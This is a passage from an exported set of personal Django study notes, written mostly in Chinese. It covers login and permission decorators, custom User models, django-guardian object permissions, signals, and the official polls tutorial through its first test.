my_view(request): ... login_required 装饰器会判断当前用户是否已经登录：如果已经登录，执行正常的视图；如果没有登录，则会重定向到 settings.LOGIN_URL 指向的 urlpatern，并将当前访问的绝对路径作为 url 的 next 参数。\n如果你想使用自定义的参数，可以修改 login_required() 的 redirect_field_name 参数；如果你想修改重定向到的登录 URL，可以修改 login_url 参数。\n  使用 LoginRquired Mixin。通过继承 LoginRequiredMixin 类的方式限制用户。在多重继承时，该类必须是继承关系最左边的父类。一个实例如下：\nfrom django.contrib.auth.mixins import LoginRequiredMixin class MyView(LoginRequiredMixin, View): login_url = \u0026#39;/login/\u0026#39; redirect_field_name = \u0026#39;redirect_to\u0026#39;   进行测试，根据测试结果确定动作。比如根据邮箱地址判断用户权限：\nfrom django.shortcuts import redirect def my_view(request): if not request.user.email.endswith(\u0026#39;@example.com\u0026#39;): return redirect(\u0026#39;/login/?next=%s\u0026#39; % request.path) # ...   使用权限需求修饰器，Django 内置的装饰器 permission_required 会根据用户权限，决定视图的访问权限。权限的格式为：\u0026lt;app label\u0026gt;.\u0026lt;permission codename\u0026gt;，同 login_required，该装饰器还有一个可选的 login_url 参数，无权限用户会跳转到该 url。一个使用的例子如下：\nfrom django.contrib.auth.decorators import permission_required @permission_required(\u0026#39;polls.can_vote\u0026#39;, login_url=\u0026#39;/loginpage/\u0026#39;) def my_view(request): ...   Extending the existing User model #  Django 用户认证系统提供的内置的 User 对象仅包含以下一些主要的属性：\n username, password, email, first_name, last_name  对于一些网站来说，用户可能还包含有昵称、头像、个性签名等等其它属性，因此仅仅使用 Django 内置的 User 模型是不够。好在 Django 用户系统遵循可拓展的设计原则，我们可以方便地拓展 User 模型。\n我们可以通过以下两种方法扩展我们的 User 模型。\nuse a OneToOneField #  这适用于只希望存储与 User 相关联的用户模型，通常命名为Profile，models 定义如下：\nfrom django.contrib.auth.models import User class Employee(models.Model): user = models.OneToOneField(User, on_delete=models.CASCADE) department = models.CharField(max_length=100) 可以通过以下的方式获取相关的信息：\n\u0026gt;\u0026gt;\u0026gt; u = User.objects.get(username=\u0026#34;a_username\u0026#34;) \u0026gt;\u0026gt;\u0026gt; a_department= u.employee.department 为了在 Admin 的界面管理我们的模型，需要在 admin.py 文件中添加以下模板：\nfrom django.contrib import admin from django.contrib.auth.admin import UserAdmin as BaseUserAdmin from django.contrib.auth.models import User from my_user_profile_app.models import Employee # 为 Employee 定义一个内联的管理员描述 # Employee 和 User 表就会看起来像一张表一样 class EmployeeInline(admin.StackedInline): model = Employee can_delete = False verbose_name_plural = \u0026#39;employee\u0026#39; class UserAdmin(BaseUserAdmin): inlines = (EmployeeInline,) admin.site.unregister(User) admin.site.register(User, UserAdmin) 为了将我们定义的新 User 提交到 Django，令其可以识别，需要在 settings 中添加以下代码：\nAUTH_USER_MODEL = \u0026#39;myapp.MyUser\u0026#39; 并且将 User 所在的应用添加到 INSTALLED_APPS 中。\nUsing a custom user model #  Django 强烈推荐我们使用 AbstractUser 来派生我们自己定义的 User 对象。事实上，系统定义的 User 对象实际上也是继承自 AbstracUser 的抽象基类，仅仅是继承，没有做任何拓展，源码如下：\nfrom django.db import models from django.contrib.auth.models import AbstractUser class User(AbstractUser): \u0026#34;\u0026#34;\u0026#34; Users within the Django authentication system are represented by this model. Username, password and email are required. Other fields are optional. \u0026#34;\u0026#34;\u0026#34; class Meta(AbstractUser.Meta): swappable = \u0026#39;AUTH_USER_MODEL\u0026#39; 所以，如果我们通过继承 AbstractUser，将获得 User 的全部特性，而且还可以根据自己的需求进行拓展。\nPostScript：不要忘记像前一种方法一样在 setting.py 中添加 AUTH_USER_MODEL 与 INSTALLED_APPS 设置。\n一个实例如下：\n  在 users/models.py 中写下如下代码：\nfrom django.db import models from django.contrib.auth.models import AbstractUser class User(AbstractUser): nickname = models.CharField(max_length=50, blank=True) class Meta(AbstractUser.Meta): pass   在 settings.py 中添加以下代码：\nAUTH_USER_MODEL = \u0026#39;users.User\u0026#39; LANGUAGE_CODE = \u0026#39;zh-hans\u0026#39; TIME_ZONE = \u0026#39;Asia/Shanghai\u0026#39;   运行以下的两行代码：\n$ python manage.py makemigrations $ python manage.py migrate   "},{"id":378,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/python/django/guardian/","title":"Guardian","section":"Django","content":" 项目地址：https://github.com/django-guardian/django-guardian\n官方文档：https://django-guardian.readthedocs.io/en/stable/\n中文介绍：https://www.jianshu.com/p/404fd39d5efc\n django-guardian #  django-guardian 是一个对象权限的框架。\n对象权限是一种对象颗粒度上的权限机制，它允许为每个具体对象授权。\nDjango 其实包含了 object permission 的框架，但没有具体实现，object permission 的实现需要借助第三方 appdjango-guardian**，**我们在开发中用调用 django guradian 封装好的方法即可。\nTutorial #    安装：\n$ pip install django-guardian   配置：\n在 INSTALLED_APPS 中添加一个该模块：\nINSTALLED_APPS = ( ... \u0026#39;guardian\u0026#39;, ) 在 settings.py 中新添加一个数据 AUTENTICATION_BACKENDS：\nAUTHENTICATION_BACKENDS = ( \u0026#39;django.contrib.auth.backends.ModelBackend\u0026#39;, # default \u0026#39;guardian.backends.ObjectPermissionBackend\u0026#39;, ) 然后生成 guardian 的数据表：\n$ python manage.py migrate   给对象赋权：\n\u0026gt;\u0026gt;\u0026gt; from django.contrib.auth.models import User, Group \u0026gt;\u0026gt;\u0026gt; jack = User.objects.create_user(\u0026#39;jack\u0026#39;, \u0026#39;jack@example.com\u0026#39;, \u0026#39;topsecretagentjack\u0026#39;) \u0026gt;\u0026gt;\u0026gt; admins = Group.objects.create(name=\u0026#39;admins\u0026#39;) \u0026gt;\u0026gt;\u0026gt; jack.has_perm(\u0026#39;change_group\u0026#39;, admins) False \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; # 关键 \u0026gt;\u0026gt;\u0026gt; from guardian.models import UserObjectPermission \u0026gt;\u0026gt;\u0026gt; UserObjectPermission.objects.assign_perm(\u0026#39;change_group\u0026#39;, jack, obj=admins) \u0026lt;UserObjectPermission: admins | jack | change_group\u0026gt; \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; jack.has_perm(\u0026#39;change_group\u0026#39;, admins) True   admin-site 界面中：\nfrom django.contrib import admin from myapp.models import Author from guardian.admin import GuardedModelAdmin # Old way: #class AuthorAdmin(admin.ModelAdmin): # pass # With object permissions support class AuthorAdmin(GuardedModelAdmin): pass admin.site.register(Author, AuthorAdmin)   "},{"id":379,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/python/django/signals/","title":"Signals","section":"Django","content":"Django Signals #  Built-in Signals #  Django provides a set of built-in signals that let user code get notified by Django itself of certain actions. These include some useful notifications:\n  django.db.models.signals.pre_save \u0026amp; django.db.models.signals.post_save\nSent before or after a model’s save() method is called.\n  django.db.models.signals.pre_delete \u0026amp; django.db.models.signals.post_delete\nSent before or after a model’s delete() method or queryset’s delete() method is called.\n  django.db.models.signals.m2m_changed\nSent when a ManyToManyField on a model is changed.\n  django.core.signals.request_started \u0026amp; django.core.signals.request_finished\nSent when Django starts or finishes an HTTP request.\n  See the built-in signal documentation for a complete list, and a complete explanation of each signal.\nListen to Signals #  To receive a signal, register a receiver function using the Signal.connect() method. The receiver function is called when the signal is sent:\n# 函数原型 Signal.connect(receiver, sender=None, weak=True, dispatch_uid=None) \u0026#34;\u0026#34;\u0026#34; 参数说明： - receiver: 信号发生的回调函数 See [Receiver functions](https://docs.djangoproject.com/en/2.1/topics/signals/#receiver-functions) - sender: 指定一个信号的发生者 See [Connecting to signals sent by specific senders](https://docs.djangoproject.com/en/2.1/topics/signals/#connecting-to-specific-signals) - weak: 暂时没看懂，反正默认是 True 就对了 - dispatch_uid: 在可能发生重复信号的情况下设置接受器的唯一标识 \u0026#34;\u0026#34;\u0026#34; "},{"id":380,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/python/django/tutorial/tutorial01/","title":"Tutorial01","section":"Tutorial","content":" 学习网址：https://www.djangoproject.com/start/\n Tutorial01 #  使用 Django，请配置 Python3.5 及以上环境，查看 Python 版本请使用以下命令：\n$ python --version 本 tutorial 建立在已经安装 Django 环境的基础上，Django 是 Python 的一个模块，可以通过以下命令安装：\n$ pip install django 可以通过以下命令检测 Django 是否已经安装：\n$ python -m django --version # 已经安装返回版本号，未安装返回 No module named django. Createing a project #  第一次使用 Django，先进行初始化，使用 cd （change directory）命令到工作到目标文件夹，使用以下命令在当前文件夹下创建一个新的 Django 项目：\n$ django-admin startproject mysite PostScript: 项目的名称不应该与被 Python 或 Django 占用的关键词重合，比如：django 或 test 。\n上述命令会自动生成以下文件，文件功能解释：\n  manage.py：Django 提供的与项目进行交互的一个 Python 脚本文件，详细信息。\n  mysite/：Python 项目的实际模块包，该文件夹的名字与项目名称相同。\n  mysite/__init__.py：一个空文件。根据 Python 的标准规定，定义一个模块需要一个 __init__.py 文件，该空文件表示 mysite 是一个 Python 模块。\n  mysite/settings.py：Django 项目配置文件。详细信息。\n  mysite/urls.py：Django 项目的 URL 声明。详细信息。\n  mysite/wsgi.py：兼容 wsgi 的 web 服务入口。部署信息。\n  The development server #  可以使用以下命令运行服务：\n$ python manage.py runserver 默认运行端口是 8000，也可以指定端口运行服务：\n$ python manage.py runserver 8000 完整的参考信息。\nCreating the Polls app #  app 与 project 的区别？\n app 是一个项目中具体完成某项功能的应用。一个项目由许多个 app 组成。  app 可以在任何位置，本 Tutorial 中，将其置于 managy.py 的同级目录下，输入以下命令：\n$ python manage.py startapp polls Write your first view #  将以下代码写入 polls/views.py：\nfrom django.http import HttpResponse def index(request): return HttpResponse(\u0026#34;Hello, world. You\u0026#39;re at the polls index.\u0026#34;) 在 polls 文件夹内创建一个名为 urls.py 的文件，将以下代码写入 polls/urls.py：\nfrom django.urls import path from . import views urlpatterns = [ path(\u0026#39;\u0026#39;, views.index, name=\u0026#39;index\u0026#39;), ] 下一步是在 mysite/urls.py 中导入我们刚才写的 polls/urls.py。先从 django.urls 库中导入 include 模块，并且加入 path('polls/',include('polls.urls')) 在 urlpatterns 中。mysite/urls.py 文件大致如下：\nfrom django.contrib import admin from django.urls import include, path urlpatterns = [ path(\u0026#39;polls/\u0026#39;, include(\u0026#39;polls.urls\u0026#39;)), path(\u0026#39;admin/\u0026#39;, admin.site.urls), ] 输入配置服务器中的指令，并在浏览器中打开以下 url：https://localhost:8000/polls/。即可在浏览器中看到 polls/views.py 中响应的 http 请求。\nPostScript：建议总是使用 include 来导入其他的 urlpatterns。\nPostScript：关于 path() 函数的参数：\n route：一个包含 URL 模式字符串。Django 在收到一个请求后，会一个个遍历 URL patterns 中的字符串，找到符合的后进入该模式字符串指向的页面。 view：route 参数中的模式字符串对应的 view 函数。 两个可选参数：kwargs 与 name。  "},{"id":381,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/python/django/tutorial/tutorial02/","title":"Tutorial02","section":"Tutorial","content":"Tutorial02 #  Database setup #  打开 mysite/settings.py，这是一个 Python 的模块变量，表示着 Django 的设置。\nDjango 的数据库默认使用 SQLite，如果想使用其他 DBMS，需要更改 DATABASES 这个 Python 字典中，'default' 键值对应的字典，进行以下设置：\n   \u0026lsquo;default\u0026rsquo; 字典键 \u0026lsquo;default\u0026rsquo; 字典可能值     'ENGINE' 'django.db.backends.sqlite3', 'django.db.backends.postgresql','django.db.backends.mysql', 'django.db.backends.oracle' , etc   'NAME' 数据库的名称，如果使用 sqlite，则为文件的路径   'USER' 登录数据库的用户名，非 sqlite 数据库必须添加   'PASSWORD' ##登录数据库用户名对应的密码，非 sqlite 数据库必须添加   'HOST' 连接数据库的主机名，sqlite 数据库不需声明，空字符串表示 'localhost'    mysite/settings.py 中 TIME_ZONE 变量可以用于设置时区。\nmysite/settings.py 中 INSTALLED_APPS 表示项目中所有应用的名字，默认情况下，包括了以下来自 Django 的 apps：\n django.contrib.admin – The admin site. You’ll use it shortly. django.contrib.auth – An authentication system. django.contrib.contenttypes – A framework for content types. django.contrib.sessions – A session framework. django.contrib.messages – A messaging framework. django.contrib.staticfiles – A framework for managing static files.  这里面的有些应用需要数据库中至少有一个表格，我们使用下面的命令创建他们：\n$ python manage.py migrate Creating models #  Models：模型，指明了数据库构造方式。一个模型对象对应一个表格，对象数据成员即为表格属性。\n我们尝试在 polls 应用中新建两个名为 Question 和 Choice 的模型。在 polls/models.py 中使用两个 Python 的类表示，如下代码非常直白：\nfrom django.db import models class Question(models.Model): question_text = models.CharField(max_length=200) pub_date = models.DateTimeField(\u0026#39;date published\u0026#39;) class Choice(models.Model): question = models.ForeignKey(Question, on_delete=models.CASCADE) choice_text = models.CharField(max_length=200) votes = models.IntegerField(default=0) Activating models #  通过 models ，可以直接在数据库中创建表格 或 操作数据库中的数据。但首先我们需要告诉 Django，该 polls 应用已经安装在了我们的项目中。\n为了将我们的 apps 加入到我们的项目，我们需要更改 mysites/settings.py 中的 INSTALLED_APPS 设置。Polls 的配置文件在 polls/apps.py 文件的 PollsConfig 中，所以 mysite/settings.py 更改如下：\nINSTALLED_APPS = [ \u0026#39;polls.apps.PollsConfig\u0026#39;, \u0026#39;django.contrib.admin\u0026#39;, \u0026#39;django.contrib.auth\u0026#39;, \u0026#39;django.contrib.contenttypes\u0026#39;, \u0026#39;django.contrib.sessions\u0026#39;, \u0026#39;django.contrib.messages\u0026#39;, \u0026#39;django.contrib.staticfiles\u0026#39;, ] 现在 Django 知道了需要添加 polls 这个应用，执行以下命令建立我们创建的 models 对应的数据库：\n$ python manage.py makemigrations polls 因为在 Django 中写的应用有着很强的移植性，在一个项目中写的应用可以轻松移植到其他应用上，所以 Django 提供了以上的命令重新安装移植的命令 → 所以以上执行 makemigrations polls 命令就是把 polls 这个应用移植到本项目，并进行创建数据库。\nDjango 会将改变之后的内容存储在 migration 中，可以在 polls/migrations/0001_initial.py 这个文件中看到数据库的表格的创建方式。\n以下一个命令执行 polls/migrations/0001_initial.py 的内容：（回显执行的 sql 命令）\n$ python manage.py sqlmigrate polls 0001 如果你不进行以上的迁徙操作，可以通过以下的命令查看会出现的问题：\n$ python manage.py check 总结：当你更改了 Django 项目的一个模型后，你需要通过以下的三步适配这些变化：\n 创建一个模型 models.py 执行命令 python manage.py makemigrations，在 migrations/ 中生成数据库生成的中间 Python 脚本 执行命令 python manege.py migrate，执行中间 Python 脚本，生成/修改数据库。  PostScript：你可以在下面这个网站查看完整的 manage.py 使用说明。\nPostScript：可以在以下网站查看关于 Django 模型的使用，中文使用说明，官网使用说明。\nPlaying with API #  使用 Django 提供的以下命令，可以在该项目下进入 Python 的用户交互界面，可以用于测试刚才创建的 Question 和 Choice 模块：\n$ python manage.py shell 以下命令，可以测试 Python 数据库提供的 API：\n\u0026gt;\u0026gt;\u0026gt; from polls.models import Choice, Question # 从我们定义的应用 polls 的模块中导入 Choice 和 Question 对象 \u0026gt;\u0026gt;\u0026gt; Question.objects.all() \u0026lt;QuerySet []\u0026gt; # 这表示数据库中还没有 Question 这个对象 \u0026gt;\u0026gt;\u0026gt; from django.utils import timezone \u0026gt;\u0026gt;\u0026gt; q = Question(question_text=\u0026#34;What\u0026#39;s new?\u0026#34;, pub_date=timezone.now()) # 创建一个 Question 的对象 q, question_text 是 \u0026#34;What\u0026#39;s new?\u0026#34; \u0026gt;\u0026gt;\u0026gt; q.save() # 将 q 这个 Question 对象存储进入数据库中 \u0026gt;\u0026gt;\u0026gt; Question.objects.all() \u0026lt;QuerySet [\u0026lt;Question: Question object (1)\u0026gt;]\u0026gt; # 我们新创建了一个 Question 对象 Django 提供的数据库查询操作 API 相关文档。\nIntroducing the Django Admin #  Creating an admin user #  使用以下命令创建一个 admin 用户：\n$ python manage.py createsuperuser Starting the development server #  如同之前一样按照以下命令启动服务器：\n$ python manage.py runserver 在浏览器中访问 URL：localhost:8000/admin/，输入在上一步中创建的用户名和密码，可以进入管理页面。\nMake the poll app modifiable in the admin #  进入后发现页面中并没有显示我们创建的 Question 和 Choice 对象。\n这时我们需要编辑 polls/admin.py 这个文件，输入以下代码：\nfrom django.contrib import admin # Register your models here. from .models import Question, Choice admin.site.register(Question) admin.site.register(Choice) 这时刷新浏览器，即可查看 polls 中的 Question 和 Choice 对象。\n"},{"id":382,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/python/django/tutorial/tutorial03/","title":"Tutorial03","section":"Tutorial","content":"Tutorial03 #  Overview #  Django 中定义了一个特殊的对象，称作 view，它抽象地对应着一个网页，Django 通过一个函数来抽象表示一个 view。同时 Django 提供了叫做 URLconfs 的东西，会将一个个 URL 模式字符串一一对应到每一个 view 中。\nWriting more view #  我们可以在 polls/views.py 中加入以下代码：\ndef detail(request, question_id): return HttpResponse(\u0026#34;You\u0026#39;re looking at question %s.\u0026#34; % question_id) def results(request, question_id): response = \u0026#34;You\u0026#39;re looking at the results of question %s.\u0026#34; return HttpResponse(response % question_id) def vote(request, question_id): return HttpResponse(\u0026#34;You\u0026#39;re voting on question %s.\u0026#34; % question_id) 然后将以下代码添加到 polls/urls.py 文件中：\nfrom django.urls import path from . import views urlpatterns = [ # ex: /polls/ path(\u0026#39;\u0026#39;, views.index, name=\u0026#39;index\u0026#39;), # ex: /polls/5/ path(\u0026#39;\u0026lt;int:question_id\u0026gt;/\u0026#39;, views.detail, name=\u0026#39;detail\u0026#39;), # ex: /polls/5/results/ path(\u0026#39;\u0026lt;int:question_id\u0026gt;/results/\u0026#39;, views.results, name=\u0026#39;results\u0026#39;), # ex: /polls/5/vote/ path(\u0026#39;\u0026lt;int:question_id\u0026gt;/vote/\u0026#39;, views.vote, name=\u0026#39;vote\u0026#39;), ] 注意其中 \u0026lt;int:question_id\u0026gt; 这一部分：\n \u0026lt;int: 这一部分将 URL 中的请求部分转化成指定的类型，同时决定指向的模式字符串。 :question_id\u0026gt; 这一部分给定匹配的模式字符串一个变量名。  PostScript：不建议愚蠢地将像 .html 一样的 URL cruft 添加到 path 中，比如：\npath(\u0026#39;polls/latest.html\u0026#39;, views.index) Write views that actually do something #  每个 views 主要完成两件事情：返回包含所请求页面内容的 HttpRsponse 对象，或返回异常。\n我们在 polls/views.py 中完成以下的事情（根据发布的日期显示系统中的最新的 5 个投票问题）：\nfrom django.http import HttpResponse from .models import Question def index(request): latest_question_list = Question.objects.order_by(\u0026#39;-pub_date\u0026#39;)[:5] output = \u0026#39;, \u0026#39;.join([q.question_text for q in latest_question_list]) return HttpResponse(output) 这样的返回 Http 是硬核编码在 Python 代码中的，为了使前端代码与 Python 的后端代码分离，我们需要在应用中创建一个 templates 的子目录，进行渲染工作的 DjangoTemplates 会在每个 INSTALLED_APPS 中寻找一个 templates 的子目录。\n所以我们创建目录以及文件 polls/templates/polls/index.html，并且写入以下内容：\n{% if latest_question_list %} \u0026lt;ul\u0026gt; {% for question in latest_question_list %} \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;/polls/{{ question.id }}/\u0026#34;\u0026gt;{{ question.question_text }}\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; {% endfor %} \u0026lt;/ul\u0026gt; {% else %} \u0026lt;p\u0026gt;No polls are available.\u0026lt;/p\u0026gt; {% endif %} 将 polls/views.py，更改成以下内容：\nfrom django.http import HttpResponse from django.template import loader from .models import Question def index(request): latest_question_list = Question.objects.order_by(\u0026#39;-pub_date\u0026#39;)[:5] template = loader.get_template(\u0026#39;polls/index.html\u0026#39;) context = { \u0026#39;latest_question_list\u0026#39;: latest_question_list, } return HttpResponse(template.render(context, request)) 主要到代码的最后一行：加载模板，Python 渲染，返回 Http 响应 → 是一个常用的功能，Django 将这三个功能集成到了一起形成了一个 shortcut，即可以用以下简化的代码表示：\nfrom django.shortcuts import render from .models import Question def index(request): latest_question_list = Question.objects.order_by(\u0026#39;-pub_date\u0026#39;)[:5] context = {\u0026#39;latest_question_list\u0026#39;: latest_question_list} return render(request, \u0026#39;polls/index.html\u0026#39;, context) Raising a 404 error #  Django 定义了一个返回 404 错误码的模块，通过以下方式导入：\nfrom django.http import Http404 在应用中，我们使用抛出异常的方式使用导入的 Http404，如下：\nraise Http404(\u0026#34;This is a 404 error!\u0026#34;) 一个实际的应用场景如下：\nfrom django.http import Http404 from django.shortcuts import render from .models import Question # ... def detail(request, question_id): try: question = Question.objects.get(pk=question_id) except Question.DoesNotExist: raise Http404(\u0026#34;Question does not exist\u0026#34;) return render(request, \u0026#39;polls/detail.html\u0026#39;, {\u0026#39;question\u0026#39;: question}) 这段代码的意思是，从 Question 对应的所有对象中寻找一个 pk=quesition_id 的对象，如果不存在则抛出 Http404 的异常。\n这个功能比较常用，因此 Django 提供了一个 shortcut：get_object_or_404。一个实例代码如下：\nfrom django.shortcuts import get_object_or_404, render from .models import Question # ... def detail(request, question_id): question = get_object_or_404(Question, pk=question_id) return render(request, \u0026#39;polls/detail.html\u0026#39;, {\u0026#39;question\u0026#39;: question}) 还有一个类似的 shortcut 函数为：get_list_or_404\nRemoving hardcodeed URLs in templates #  在之前编写的 html 模板文件中，href 指向的 url 出现了直接拼接字符串的硬编码方式，我们可以使用以下的方式替换这种写法：\n\u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;{% url \u0026#39;polls\u0026#39; question.id %}\u0026#34;\u0026gt;{{ question.question_text }}\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;!-- 原来的写法： \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;/polls/{{ question.id }}/\u0026#34;\u0026gt;{{ question.question_text }}\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; --!\u0026gt; 这样做的好处是，将这个 href 与 urlpatterns 中对应的模式字符串连接起来，他们的任何改变会相互影响。\nNamespacing URL names #  在实际的项目中可能存在许许多多的应用，那么使用上面的方法如何知道 URL 指向那个应用呢？\n在应用的 urls.py 这个文件中，可以在 urlpattern 列表定义之前，加入：\napp_name = \u0026#39;polls\u0026#39; 于是，可以对将应用模板改成如下形式：\n\u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;{% url \u0026#39;polls:detail\u0026#39; question.id %}\u0026#34;\u0026gt;{{ question.question_text }}\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;!-- 原来的写法： \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;{% url \u0026#39;detail\u0026#39; question.id %}\u0026#34;\u0026gt;{{ question.question_text }}\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; --!\u0026gt; "},{"id":383,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/python/django/tutorial/tutorial04/","title":"Tutorial04","section":"Tutorial","content":"Tutorial04 #  Write a simple form #  我们可以在之前编写的 html 文件的模板中加入 \u0026lt;form\u0026gt; 元素，以便我们后续的研究：\n\u0026lt;h1\u0026gt;{{ question.question_text }}\u0026lt;/h1\u0026gt; {% if error_message %}\u0026lt;p\u0026gt;\u0026lt;strong\u0026gt;{{ error_message }}\u0026lt;/strong\u0026gt;\u0026lt;/p\u0026gt;{% endif %} \u0026lt;form action=\u0026#34;{% url \u0026#39;polls:vote\u0026#39; question.id %}\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; {% csrf_token %} {% for choice in question.choice_set.all %} \u0026lt;input type=\u0026#34;radio\u0026#34; name=\u0026#34;choice\u0026#34; id=\u0026#34;choice{{ forloop.counter }}\u0026#34; value=\u0026#34;{{ choice.id }}\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;choice{{ forloop.counter }}\u0026#34;\u0026gt;{{ choice.choice_text }}\u0026lt;/label\u0026gt;\u0026lt;br\u0026gt; {% endfor %} \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Vote\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; 以上的代码大致意思是在提交表单后，会连接到 polls 这个应用中，名为 vote 的 urlpattern，因此你需要在文件 User/urls.py 这个文件中为 urlpattern 添加以下代码：\npath(\u0026#39;\u0026lt;int:question_id\u0026gt;/vote/\u0026#39;, views.vote, name=\u0026#39;vote\u0026#39;), 然后可以在 html 代码中注意到，在链接到 url 时，还传递了一个参数 question.id，这个参数会被 urlpattern 指向的函数作为传递参数，以下为 vote 函数实例：\nfrom django.http import HttpResponse, HttpResponseRedirect from django.shortcuts import get_object_or_404, render from django.urls import reverse from .models import Choice, Question # ... def vote(request, question_id): question = get_object_or_404(Question, pk=question_id) try: selected_choice = question.choice_set.get(pk=request.POST[\u0026#39;choice\u0026#39;]) except (KeyError, Choice.DoesNotExist): return render(request, \u0026#39;polls/detail.html\u0026#39;, { \u0026#39;question\u0026#39;: question, \u0026#39;error_message\u0026#39;: \u0026#34;You didn\u0026#39;t select a choice.\u0026#34;, }) else: selected_choice.votes += 1 selected_choice.save() # 每次处理 POST 数据时，都应当使用 HttpResponseRedirect 这个函数 # 因为有时用户不停点击按键会发送多次请求 return HttpResponseRedirect(reverse(\u0026#39;polls:results\u0026#39;, args=(question.id,))) PostScript：这个代码其实是存在问题的，比如两个用户同时访问我们的页面，同时进行投票后我们的数据库中的 vote 只增加了一票，而实际上应该增加两票，这一点被称作 竞争条件 (race condition)，查看解决方法。\nUse generic views: Less code is better #  之前我们做的许多工作都在完成这样一件事情：通过用户访问的 URL 从数据库中提取数据，并且渲染相应的 html 模板。许多 WEB 系统中都会完成这一项功能，所以 Django 提供了一个 shortcut 来集成地完成这些功能，称作 通用视图 (generic views)。\nAmend URLconf #  首先，把 polls/urls.py 文件修改成如下形式：\nfrom django.urls import path from . import views app_name = \u0026#39;polls\u0026#39; urlpatterns = [ path(\u0026#39;\u0026#39;, views.IndexView.as_view(), name=\u0026#39;index\u0026#39;), path(\u0026#39;\u0026lt;int:pk\u0026gt;/\u0026#39;, views.DetailView.as_view(), name=\u0026#39;detail\u0026#39;), path(\u0026#39;\u0026lt;int:pk\u0026gt;/results/\u0026#39;, views.ResultsView.as_view(), name=\u0026#39;results\u0026#39;), path(\u0026#39;\u0026lt;int:question_id\u0026gt;/vote/\u0026#39;, views.vote, name=\u0026#39;vote\u0026#39;), ] Amend views #  然后，把 polls/views.py 文件修改成如下形式：\nfrom django.http import HttpResponseRedirect from django.shortcuts import get_object_or_404, render from django.urls import reverse from django.views import generic from .models import Choice, Question class IndexView(generic.ListView): template_name = \u0026#39;polls/index.html\u0026#39; context_object_name = \u0026#39;latest_question_list\u0026#39; def get_queryset(self): \u0026#34;\u0026#34;\u0026#34;Return the last five published questions.\u0026#34;\u0026#34;\u0026#34; return Question.objects.order_by(\u0026#39;-pub_date\u0026#39;)[:5] class DetailView(generic.DetailView): model = Question template_name = \u0026#39;polls/detail.html\u0026#39; class ResultsView(generic.DetailView): model = Question template_name = \u0026#39;polls/results.html\u0026#39; def vote(request, question_id): ... # same as above, no changes needed. 上面的更改简而言之是将函数式编程，重组成了面向对象式编程。注意到其中的对象派生自 generic.ListView 与 generic.DetailView，这两个系统对象分别抽象出 ”显示对象列表“ 和 ”显示特定类型对象的详细界面“。\n默认情况下，DetailView 这个视图会使用 \u0026lt;app_name\u0026gt;/\u0026lt;model_name\u0026gt;_detail.html 这个前端模板。\n同理 ListView 也会使用 \u0026lt;app_name\u0026gt;/\u0026lt;model_name\u0026gt;_list.html 这个模板。\n完整的通用视图使用方法，可以查看说明文档。\n"},{"id":384,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/python/django/tutorial/tutorial05/","title":"Tutorial05","section":"Tutorial","content":"Tutorial05 #  Introducing automated testing #  自动化测试：\n 测试可以节省你的时间 测试不仅仅可以发现问题，还能防止问题 测试使你的代码更受欢迎 测试有助于团队合作  Writing our first test #  1. identify a bug #  onfirm the bug by using the shell to check the method on a question whose date lies in the future:\n$ python manage.py shell \u0026gt;\u0026gt;\u0026gt; import datetime \u0026gt;\u0026gt;\u0026gt; from django.utils import timezone \u0026gt;\u0026gt;\u0026gt; from polls.models import Question \u0026gt;\u0026gt;\u0026gt; # create a Question instance with pub_date 30 days in the future \u0026gt;\u0026gt;\u0026gt; future_question = Question(pub_date=timezone.now() + datetime.timedelta(days=30)) \u0026gt;\u0026gt;\u0026gt; # was it published recently? \u0026gt;\u0026gt;\u0026gt; future_question.was_published_recently() True 2. create a test to expose the bug #  通常，我们会把测试代码放在应用的tests.py文件中，测试系统将自动地从任何名字以test开头的文件中查找测试程序。每个app在创建的时候，都会自动创建一个tests.py文件，就像views.py等文件一样。\n将下面的代码输入投票应用的polls/tests.py文件中：\nimport datetime from django.utils import timezone from django.test import TestCase from .models import Question class QuestionMethodTests(TestCase): def test_was_published_recently_with_future_question(self): \u0026#34;\u0026#34;\u0026#34; 在将来发布的问卷应该返回False \u0026#34;\u0026#34;\u0026#34; time = timezone.now() + datetime.timedelta(days=30) future_question = Question(pub_date=time) self.assertIs(future_question.was_published_recently(), False) 我们在这里创建了一个django.test.TestCase的子类，它具有一个方法，该方法创建一个pub_date在未来的Question实例。最后我们检查was_published_recently()的输出，它应该是 False。\n3. Running tests #  在终端中，运行下面的命令，\n$ python manage.py test polls 你将看到结果如下：\nCreating test database for alias \u0026#39;default\u0026#39;... F ====================================================================== FAIL: test_was_published_recently_with_future_question (polls.tests.QuestionMethodTests) ---------------------------------------------------------------------- Traceback (most recent call last): File \u0026#34;/path/to/mysite/polls/tests.py\u0026#34;, line 16, in test_was_published_recently_with_future_question self.assertIs(future_question.was_published_recently(), False) AssertionError: True is not False ---------------------------------------------------------------------- Ran 1 test in 0.001s FAILED (failures=1) Destroying test database for alias \u0026#39;default\u0026#39;... 这其中都发生了些什么？：\n python manage.py test polls 命令会查找 polls 应用中所有的测试程序 发现一个 django.test.TestCase 的子类 